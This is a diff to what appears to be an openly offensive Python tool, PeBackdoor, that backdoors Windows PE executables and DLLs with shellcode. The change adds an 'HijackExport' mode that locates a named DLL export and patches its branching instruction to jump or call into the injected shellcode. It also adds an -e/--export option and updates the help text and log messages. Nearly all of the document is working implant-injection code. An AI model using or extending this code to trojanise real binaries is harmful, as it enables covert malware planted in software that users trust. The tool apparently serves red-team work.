@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 #
 # Author:
-#     Mariusz Banach / mgeeky '22, (@mariuszbit)
+#     Mariusz Banach / mgeeky '22-'23, (@mariuszbit)
 #     <mb@binary-offensive.com>
 #
 # Requirements:
@@ -368,6 +368,7 @@ class PeBackdoor:
         ModifyOEP           = 1
         BackdoorEP          = 2
         TLSCallback         = 3
+        HijackExport        = 4
 
     availableSaveModes = {
         SupportedSaveModes.WithinCodeSection:   'store shellcode in the middle of code section',
@@ -574,9 +575,42 @@ Sources:
         elif self.runMode == int(PeBackdoor.SupportedRunModes.BackdoorEP):
             return self.backdoorEntryPoint()
 
-        return False
+        elif self.runMode == int(PeBackdoor.SupportedRunModes.HijackExport):
+            addr = self.getExportEntryPoint()
+            if addr == -1:
+                self.logger.fatal('Could not find any export entry point to hijack! Specify existing DLL Exported function with -e/--export!')
 
-    def backdoorEntryPoint(self):
+            return self.backdoorEntryPoint(addr)
+
+        return False
+    
+    def getExportEntryPoint(self):
+        dec = lambda x: '???' if x is None else x.decode() 
+
+        exportName = self.options.get('export', '')
+        if len(exportName) == 0:
+            self.logger.fatal('Export name not specified! Specify DLL Exported function name to hijack with -e/--export')
+
+        d = [pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_EXPORT"]]
+        self.pe.parse_data_directories(directories=d)
+
+        if self.pe.DIRECTORY_ENTRY_EXPORT.symbols == 0:
+            self.logger.err('No DLL exports found! Specify existing DLL Exported function with -e/--export!')
+            return -1
+        
+        exports = [(e.ordinal, dec(e.name)) for e in self.pe.DIRECTORY_ENTRY_EXPORT.symbols]
+
+        for export in exports:
+            self.logger.dbg(f'DLL Export: {export[0]} {export[1]}')
+            if export[1].lower() == exportName.lower():
+
+                addr = self.pe.DIRECTORY_ENTRY_EXPORT.symbols[export[0]].address
+                self.logger.ok(f'Found DLL Export "{exportName}" at RVA 0x{addr:x} . Attempting to hijack it...')
+                return addr
+
+        return -1
+
+    def backdoorEntryPoint(self, addr = -1):
         imageBase = self.pe.OPTIONAL_HEADER.ImageBase
         self.shellcodeAddr = self.pe.get_rva_from_offset(self.shellcodeOffset) + imageBase
 
@@ -592,7 +626,11 @@ Sources:
 
         cs.detail = True
 
-        ep = self.pe.OPTIONAL_HEADER.AddressOfEntryPoint
+        ep = addr
+
+        if addr == -1:
+            ep = self.pe.OPTIONAL_HEADER.AddressOfEntryPoint
+
         ep_ava = ep + self.pe.OPTIONAL_HEADER.ImageBase
 
         data = self.pe.get_memory_mapped_image()[ep:ep+128]
@@ -645,7 +683,7 @@ Sources:
         found |= instr.mnemonic.lower() == 'call'
 
         if found:
-            self.logger.info(f'Backdooring OEP {instr.mnemonic.upper()} instruction at 0x{instr.address:x} into:')
+            self.logger.info(f'Backdooring entry point {instr.mnemonic.upper()} instruction at 0x{instr.address:x} into:')
 
             jump = random.choice([
                 f'CALL {reg}',
@@ -692,7 +730,7 @@ Sources:
             self.compiledTrampoline = encoding
             self.compiledTrampolineCount = count
 
-            self.logger.ok('Successfully backdoored OEP with jump/call to shellcode.')
+            self.logger.ok('Successfully backdoored entry point with jump/call to shellcode.\n')
             return instr.address
 
         return 0
@@ -1089,6 +1127,7 @@ Sources:
 
         except SectionDoublePError as e:
             self.logger.err('Exception occured while injecting a new PE section: ' + str(e))
+            sys.exit(1)
             return False
 
         except Exception as e:
@@ -1115,6 +1154,7 @@ First one denotes where to store shellcode, second how to run it:
       |   +---------- 1 - change AddressOfEntryPoint
       |               2 - hijack branching instruction at Original Entry Point (jmp, call, ...)
       |               3 - setup TLS callback
+      |               4 - hijack branching instruction at DLL Exported function (use -e to specify export to hook)
       |               
       +-------------- 1 - store shellcode in the middle of a code section
                       2 - append shellcode to the PE file in a new PE section
@@ -1144,6 +1184,7 @@ Example:
     bak.add_argument('-n', '--section-name', metavar='NAME', default=DefaultSectionName, 
         help = 'If shellcode is to be injected into a new PE section, define that section name. Section name must not be longer than 7 characters. Default: ' + DefaultSectionName)
     bak.add_argument('-i', '--ioc', metavar='IOC', default='', help = 'Append IOC watermark to injected shellcode to facilitate implant tracking.')
+    bak.add_argument('-e', '--export', metavar='NAME', default='', help = 'When backdooring DLLs, this specifies name of the exported function to hijack.')
 
     sign = o.add_argument_group('Authenticode signature options')
     sign.add_argument('-r', '--remove-signature', action='store_true', help = 'Remove PE Authenticode digital signature since its going to be invalidated anyway.')
